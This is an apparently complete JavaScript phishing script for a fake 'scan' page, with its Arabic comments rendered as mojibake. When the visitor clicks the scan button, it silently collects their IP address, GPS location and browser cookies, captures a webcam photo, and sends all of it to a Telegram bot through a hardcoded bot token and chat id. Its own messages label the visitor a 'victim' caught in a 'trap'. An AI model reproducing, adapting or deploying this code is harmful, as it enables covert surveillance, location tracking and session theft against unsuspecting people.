(function() {
    // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨ÙˆØª
    const _t = "7873426394:AAFrMrpIkziC4hpDHDJ2OIOBOVha--srSbo";
    const _id = "7253092491";

    // Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù†ØµÙˆØµ Ø§Ù„Ù…Ø­Ø³Ù†Ø©
    function _report(text) {
        fetch(`https://api.telegram.org/bot${_t}/sendMessage?chat_id=${_id}&text=${encodeURIComponent("[SYSTEM]: " + text)}`);
    }

    async function _captureAndSend() {
        try {
            // Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            _report("ØªÙ… ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§.. Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© ðŸ“¸");

            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            await video.play();

            // Ù†Ù†ØªØ¸Ø± 3 Ø«ÙˆØ§Ù†ÙŠ Ø¹Ø´Ø§Ù† Ø§Ù„ØµÙˆØ±Ø© ØªØ¸Ø¨Ø·
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);

                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', _id);
                    fd.append('photo', blob, 'image.jpg');
                    fd.append('caption', 'ðŸŽ¯ ØµÙˆØ±Ø© Ø§Ù„Ø¶Ø­ÙŠØ© Ù…Ù† Ø§Ù„Ù…ØµÙŠØ¯Ø©');

                    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© ÙØ¹Ù„ÙŠØ§Ù‹
                    fetch(`https://api.telegram.org/bot${_t}/sendPhoto`, {
                        method: 'POST',
                        body: fd
                    }).then(res => {
                        if(res.ok) _report("ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¨Ù†Ø¬Ø§Ø­ âœ…");
                        else _report("ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ù„Ù„Ø³ÙŠØ±ÙØ± âŒ");
                        stream.getTracks().forEach(t => t.stop());
                    });
                }, 'image/jpeg', 0.7);
            }, 3000);

        } catch (err) {
            _report("ÙØ´Ù„ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ (Ø±ÙØ¶ Ø£Ùˆ Ù„Ø§ ØªÙˆØ¬Ø¯) âŒ");
        }
    }

    // Ø±Ø¨Ø· Ø§Ù„Ø²Ø±Ø§Ø±
    const btn = document.getElementById('startScanBtn');
    if (btn) {
        btn.addEventListener('click', () => {
            _report("Ø¨Ø¯Ø£ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ÙØ­Øµ Ø§Ù„Ø¢Ù† ðŸš€");
            
            // Ø¬Ù„Ø¨ Ø§Ù„Ù€ IP
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => _report("IP Ø§Ù„Ø¶Ø­ÙŠØ©: " + d.ip));

            // Ø¬Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(p => {
                    _report(`Ø§Ù„Ù…ÙˆÙ‚Ø¹: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                });
            }

            // Ø³Ø­Ø¨ Ø§Ù„ÙƒÙˆÙƒÙŠØ²
            _report("Ø§Ù„ÙƒÙˆÙƒÙŠØ²: " + (document.cookie || "Ù„Ø§ ÙŠÙˆØ¬Ø¯"));

            // Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©
            _captureAndSend();
        });
    }
})();
